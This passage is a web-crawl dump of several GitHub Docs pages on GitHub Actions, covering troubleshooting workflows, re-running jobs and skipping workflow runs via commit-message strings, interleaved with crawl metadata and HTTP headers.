  "markdown": "# About troubleshooting workflows - GitHub Docs\n\nYou can use the tools in GitHub Actions to debug your workflows.\n\n## [Troubleshooting your workflows](#troubleshooting-your-workflows)\n\nThere are several ways you can troubleshoot failed workflow runs.\n\n### [Using GitHub Copilot](#using-github-copilot)\n\nIf a workflow run fails, you can open a chat with GitHub Copilot for assistance resolving the error. See [Using Copilot to troubleshoot workflows](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/using-copilot-to-troubleshoot-workflows).\n\n### [Using workflow run logs](#using-workflow-run-logs)\n\nEach workflow run generates activity logs that you can view, search, and download. For more information, see [Using workflow run logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-workflow-run-logs).\n\n### [Enabling debug logging](#enabling-debug-logging)\n\nIf the workflow logs do not provide enough detail to diagnose why a workflow, job, or step is not working as expected, you can enable additional debug logging. For more information, see [Enabling debug logging](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging).\n\n### [Canceling a workflow](#canceling-a-workflow)\n\nIf you attempt to cancel a workflow and the cancellation doesn't succeed, make sure you aren't using the `always` expression. The `always` expression causes a workflow step to run even when the workflow is canceled, which results in a hanging cancellation. For more information, see [Evaluate expressions in workflows and actions](https://docs.github.com/en/actions/learn-github-actions/expressions#always).\n\n## [Troubleshooting GitHub Actions inefficiencies](#troubleshooting-github-actions-inefficiencies)\n\nTo analyze the inefficiencies and reliability of your workflows using metrics, see [Viewing GitHub Actions metrics](https://docs.github.com/en/actions/administering-github-actions/viewing-github-actions-metrics).\n\n## [Troubleshooting self-hosted runners](#troubleshooting-self-hosted-runners)\n\nIf you use self-hosted runners, you can view their activity and diagnose common issues.\n\nFor more information, see [Monitoring and troubleshooting self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners).",
  "debug": {
    "pageType": "Category",
    "pageTypeReason": "None",
    "totalLinks": 243,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-about-troubleshooting-workflows-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-about-troubleshooting-workflows-removedElementsH",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-about-troubleshooting-workflows-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-about-troubleshooting-workflows-readableTextHtml",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-about-troubleshooting-workflows-readableTextIfPo"
    },
    "lengths": {
      "extractus": 4020,
      "readableText": 3210,
      "none": 23860,
      "readableTextIfPossible": 23860,
      "result": 3210,
      "markdown": 2421
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history",
    "loadedTime": "2025-05-08T06:38:22.529Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history",
    "title": "Viewing workflow run history - GitHub Docs",
    "description": "You can view logs for each run of a workflow. Logs include the status for each job and step in a workflow.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Viewing workflow run history - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "6C45:203D3B:CE179E:116CAB2:681C5158",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:16 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686296.415686, VS0, VE244",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26745",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Viewing workflow run history - GitHub Docs\nYou can view logs for each run of a workflow. Logs include the status for each job and step in a workflow.\nIn this article\nRead access to the repository is required to perform these steps.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-viewing-workflow-run-history-5yrxv.html",
  "markdown": "# Viewing workflow run history - GitHub Docs\n\nYou can view logs for each run of a workflow. Logs include the status for each job and step in a workflow.\n\n## In this article\n\nRead access to the repository is required to perform these steps.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 234,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-viewing-workflow-run-history-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-viewing-workflow-run-history-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-viewing-workflow-run-history-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-viewing-workflow-run-history-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-viewing-workflow-run-history-readableTextIfPossibleHt"
    },
    "lengths": {
      "extractus": 1537,
      "readableText": 592,
      "none": 24487,
      "readableTextIfPossible": 24487,
      "result": 592,
      "markdown": 239
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs",
    "loadedTime": "2025-05-08T06:38:26.923Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs",
    "title": "Re-running workflows and jobs - GitHub Docs",
    "description": "You can re-run a workflow run, all failed jobs in a workflow run, or specific jobs in a workflow run up to 30 days after its initial run.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Re-running workflows and jobs - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "B004:70BB2:5B2941:77F3CB:681BFFA2",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "20921",
      "date": "Thu, 08 May 2025 06:38:19 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686300.719728, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28458",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Re-running workflows and jobs - GitHub Docs\nYou can re-run a workflow run, all failed jobs in a workflow run, or specific jobs in a workflow run up to 30 days after its initial run.\nWho can use this feature?\nPeople with write permissions to a repository can re-run workflows in the repository.\nAbout re-running workflows and jobs\nRe-running a workflow or jobs in a workflow uses the same GITHUB_SHA (commit SHA) and GITHUB_REF (Git ref) of the original event that triggered the workflow run. The workflow will use the privileges of the actor who initially triggered the workflow, not the privileges of the actor who initiated the re-run. You can re-run a workflow or jobs in a workflow for up to 30 days after the initial run. You cannot re-run jobs in a workflow once its logs have passed their retention limits. For more information, see Usage limits, billing, and administration. When you re-run a workflow or jobs in a workflow, you can enable debug logging for the re-run. This will enable runner diagnostic logging and step debug logging for the re-run. For more information about debug logging, see Enabling debug logging\nRe-running all the jobs in a workflow\nRe-running failed jobs in a workflow\nIf any jobs in a workflow run failed, you can re-run just the jobs that failed. When you re-run failed jobs in a workflow, a new workflow run will start for all failed jobs and their dependents. Any outputs for any successful jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run.\nRe-running a specific job in a workflow\nWhen you re-run a specific job in a workflow, a new workflow run will start for the job and any dependents. Any outputs for any other jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run.\nRe-running workflows and jobs with reusable workflows\nReusable workflows from public repositories can be referenced using a SHA, a release tag, or a branch name. For more information, see Reusing workflows.\nWhen you re-run a workflow that uses a reusable workflow and the reference is not a SHA, there are some behaviors to be aware of:\nRe-running all jobs in a workflow will use the reusable workflow from the specified reference. For more information about re-running all jobs in a workflow, see Re-running workflows and jobs.\nRe-running failed jobs or a specific job in a workflow will use the reusable workflow from the same commit SHA of the first attempt. For more information about re-running failed jobs in a workflow, see Re-running workflows and jobs. For more information about re-running a specific job in a workflow, see Re-running workflows and jobs.\nReviewing previous workflow runs\nYou can view the results from your previous attempts at running a workflow. You can also view previous workflow runs using the API. For more information, see REST API endpoints for workflow runs.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nTo the right of the run name, select the Latest dropdown menu and click a previous run attempt.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-re-running-workflows-and-jobs-vb62c.html",
  "markdown": "# Re-running workflows and jobs - GitHub Docs\n\nYou can re-run a workflow run, all failed jobs in a workflow run, or specific jobs in a workflow run up to 30 days after its initial run.\n\n## Who can use this feature?\n\nPeople with write permissions to a repository can re-run workflows in the repository.\n\n## [About re-running workflows and jobs](#about-re-running-workflows-and-jobs)\n\nRe-running a workflow or jobs in a workflow uses the same `GITHUB_SHA` (commit SHA) and `GITHUB_REF` (Git ref) of the original event that triggered the workflow run. The workflow will use the privileges of the actor who initially triggered the workflow, not the privileges of the actor who initiated the re-run. You can re-run a workflow or jobs in a workflow for up to 30 days after the initial run. You cannot re-run jobs in a workflow once its logs have passed their retention limits. For more information, see [Usage limits, billing, and administration](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration#artifact-and-log-retention-policy). When you re-run a workflow or jobs in a workflow, you can enable debug logging for the re-run. This will enable runner diagnostic logging and step debug logging for the re-run. For more information about debug logging, see [Enabling debug logging](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging)\n\n## [Re-running all the jobs in a workflow](#re-running-all-the-jobs-in-a-workflow)\n\n## [Re-running failed jobs in a workflow](#re-running-failed-jobs-in-a-workflow)\n\nIf any jobs in a workflow run failed, you can re-run just the jobs that failed. When you re-run failed jobs in a workflow, a new workflow run will start for all failed jobs and their dependents. Any outputs for any successful jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run.\n\n## [Re-running a specific job in a workflow](#re-running-a-specific-job-in-a-workflow)\n\nWhen you re-run a specific job in a workflow, a new workflow run will start for the job and any dependents. Any outputs for any other jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run.\n\n## [Re-running workflows and jobs with reusable workflows](#re-running-workflows-and-jobs-with-reusable-workflows)\n\nReusable workflows from public repositories can be referenced using a SHA, a release tag, or a branch name. For more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows#calling-a-reusable-workflow).\n\nWhen you re-run a workflow that uses a reusable workflow and the reference is not a SHA, there are some behaviors to be aware of:\n\n*   Re-running all jobs in a workflow will use the reusable workflow from the specified reference. For more information about re-running all jobs in a workflow, see [Re-running workflows and jobs](https://docs.github.com/en/actions/managing-workflow-runs/re-running-workflows-and-jobs#re-running-all-the-jobs-in-a-workflow).\n*   Re-running failed jobs or a specific job in a workflow will use the reusable workflow from the same commit SHA of the first attempt. For more information about re-running failed jobs in a workflow, see [Re-running workflows and jobs](https://docs.github.com/en/actions/managing-workflow-runs/re-running-workflows-and-jobs#re-running-failed-jobs-in-a-workflow). For more information about re-running a specific job in a workflow, see [Re-running workflows and jobs](https://docs.github.com/en/actions/managing-workflow-runs/re-running-workflows-and-jobs#re-running-a-specific-job-in-a-workflow).\n\n## [Reviewing previous workflow runs](#reviewing-previous-workflow-runs)\n\nYou can view the results from your previous attempts at running a workflow. You can also view previous workflow runs using the API. For more information, see [REST API endpoints for workflow runs](https://docs.github.com/en/rest/actions/workflow-runs#get-a-workflow-run).\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  To the right of the run name, select the **Latest** dropdown menu and click a previous run attempt.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 249,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-re-running-workflows-and-jobs-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-re-running-workflows-and-jobs-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-re-running-workflows-and-jobs-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-re-running-workflows-and-jobs-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-re-running-workflows-and-jobs-readableTextIfPossibleH"
    },
    "lengths": {
      "extractus": 7146,
      "readableText": 6561,
      "none": 34260,
      "readableTextIfPossible": 34260,
      "result": 6561,
      "markdown": 5134
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs",
    "loadedTime": "2025-05-08T06:38:29.618Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs",
    "title": "Skipping workflow runs - GitHub Docs",
    "description": "You can skip workflow runs triggered by the push and pull_request events by including a command in your commit message.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Skipping workflow runs - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "E501:3FA35:F65273:13F1388:681C515E",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:22 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686302.431103, VS0, VE261",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24808",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Skipping workflow runs - GitHub Docs\nYou can skip workflow runs triggered by the push and pull_request events by including a command in your commit message.\nNote\nIf a workflow is skipped due to path filtering, branch filtering or a commit message (see below), then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging.\nWorkflows that would otherwise be triggered using on: push or on: pull_request won't be triggered if you add any of the following strings to the commit message in a push, or the HEAD commit of a pull request:\n[skip ci]\n[ci skip]\n[no ci]\n[skip actions]\n[actions skip]\nAlternatively, you can add a skip-checks trailer to your commit message. The trailers section should be included at the end of your commit message and be preceded by two empty lines. If you already have other trailers in your commit message, skip-checks should be last. You can use either of the following:\nskip-checks:true\nskip-checks: true\nBy default, Git automatically removes consecutive newlines. To leave the commit message exactly as you entered it, use the --cleanup=verbatim option on your commit. For more information, see --cleanup=<mode> in the Git documentation.\nYou won't be able to merge the pull request if your repository is configured to require specific checks to pass first. To allow the pull request to be merged you can push a new commit to the pull request without the skip instruction in the commit message.\nNote\nSkip instructions only apply to the push and pull_request events. For example, adding [skip ci] to a commit message won't stop a workflow that's triggered on: pull_request_target from running.\nSkip instructions only apply to the workflow run(s) that would be triggered by the commit that contains the skip instructions. You can also disable a workflow from running. For more information, see Disabling and enabling a workflow.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-skipping-workflow-runs-c2i17.html",
  "markdown": "# Skipping workflow runs - GitHub Docs\n\nYou can skip workflow runs triggered by the `push` and `pull_request` events by including a command in your commit message.\n\nNote\n\nIf a workflow is skipped due to [path filtering](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore), [branch filtering](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpull_requestpull_request_targetbranchesbranches-ignore) or a commit message (see below), then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging.\n\nWorkflows that would otherwise be triggered using `on: push` or `on: pull_request` won't be triggered if you add any of the following strings to the commit message in a push, or the HEAD commit of a pull request:\n\n*   `[skip ci]`\n*   `[ci skip]`\n*   `[no ci]`\n*   `[skip actions]`\n*   `[actions skip]`\n\nAlternatively, you can add a `skip-checks` trailer to your commit message. The trailers section should be included at the end of your commit message and be preceded by two empty lines. If you already have other trailers in your commit message, `skip-checks` should be last. You can use either of the following:\n\n*   `skip-checks:true`\n*   `skip-checks: true`\n\nBy default, Git automatically removes consecutive newlines. To leave the commit message exactly as you entered it, use the `--cleanup=verbatim` option on your commit. For more information, see [`--cleanup=<mode>`](https://git-scm.com/docs/git-commit#Documentation/git-commit.txt---cleanupltmodegt) in the Git documentation.\n\nYou won't be able to merge the pull request if your repository is configured to require specific checks to pass first. To allow the pull request to be merged you can push a new commit to the pull request without the skip instruction in the commit message.\n\nNote\n\nSkip instructions only apply to the `push` and `pull_request` events. For example, adding `[skip ci]` to a commit message won't stop a workflow that's triggered `on: pull_request_target` from running.\n\nSkip instructions only apply to the workflow run(s) that would be triggered by the commit that contains the skip instructions. You can also disable a workflow from running. For more information, see [Disabling and enabling a workflow](https://docs.github.com/en/actions/managing-workflow-runs/disabling-and-enabling-a-workflow).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 231,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-skipping-workflow-runs-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-skipping-workflow-runs-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-skipping-workflow-runs-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-skipping-workflow-runs-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-skipping-workflow-runs-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 2952,
      "readableText": 3110,
      "none": 22900,
      "readableTextIfPossible": 22900,
      "result": 3110,
      "markdown": 2506
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/configuring-custom-deployment-protection-rules",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/configuring-custom-deployment-protection-rules",
    "loadedTime": "2025-05-08T06:38:35.215Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/configuring-custom-deployment-protection-rules",
    "title": "Configuring custom deployment protection rules - GitHub Docs",
    "description": "Use GitHub Apps to automate protecting deployments with third-party systems.",
    "author": null,
    "keywords": "Actions,CD,Deployment",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Configuring custom deployment protection rules - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/configuring-custom-deployment-protection-rules"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/configuring-custom-deployment-protection-rules"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
